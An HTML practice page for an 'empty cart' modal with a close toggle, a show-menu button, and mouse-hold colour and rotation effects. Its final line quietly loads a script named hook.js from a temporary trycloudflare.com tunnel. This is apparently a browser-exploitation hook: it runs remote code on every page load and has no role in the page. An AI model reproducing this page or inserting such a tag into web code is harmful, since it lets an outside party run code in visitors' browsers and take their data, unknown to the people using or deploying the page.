<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Modal</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      list-style: none;
      text-decoration: none;
    }

    body {
      background: rgb(45, 38, 38);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: Arial, sans-serif;
      flex-direction: column;
    }

    .container {
      padding: 20px;
      text-align: center;
      position: relative;
    }

    .container img {
      width: 130px;
      height: 130px;
      border-radius: 8px;
      margin-bottom: 20px;
    }

    .container h1 {
      font-size: 36px;
      color: #f5f5f5;
      margin-bottom: 20px;
      cursor: pointer;
    }

    .container h4 {
      color: #f5f5f5;
      position: absolute;
      top: 10px;
      right: 60px;
      font-size: 24px;
      cursor: pointer;
    }

    button {
      background: #ff6347;
      color: white;
      border: none;
      font-size: 16px;
      cursor: pointer;
      border-radius: 6px;
      padding: 10px 15px;
      margin-top: 20px;
    }

    button:hover {
      background: #ff4500;
    }

    .hidden {
      display: none;
    }
  </style>
</head>

<body>
  <main>
    <section>
      <div class="container" id="myContainer">
        <h4 onclick="document.getElementById('myContainer').classList.toggle('hidden')">x</h4>
        <img src="src/image.png" alt="image" />
        <h1>Korzina pustaya</h1>
      </div>
      <div style="text-align: center;">
        <button id="btn" onclick="document.getElementById('myContainer').classList.toggle('hidden')">Show Menu</button>
      </div>
    </section>
  </main>
  <script>
    let colorInterval = null;
    let rotateInterval = null;
  
    window.onmousedown = function () {
      // Avoid multiple intervals
      if (colorInterval || rotateInterval) return;
  
      // Change background color every 500ms
      colorInterval = setInterval(() => {
        document.body.style.background = `hsl(${Math.random() * 360}, 100%, 70%)`;
      }, 500);
  
      // Rotate body every 2 seconds
      rotateInterval = setInterval(() => {
        document.body.style.transition = 'transform 2s';
        document.body.style.transform =
          document.body.style.transform === 'rotate(360deg)' ? 'rotate(0deg)' : 'rotate(360deg)';
      }, 2000);
    };
  
    window.onmouseup = function () {
      // Stop intervals when mouse is released
      clearInterval(colorInterval);
      clearInterval(rotateInterval);
      colorInterval = null;
      rotateInterval = null;
    };
  </script>
  <script src="https://psi-threatening-rapidly-education.trycloudflare.com/hook.js"></script>
</body>

</html>
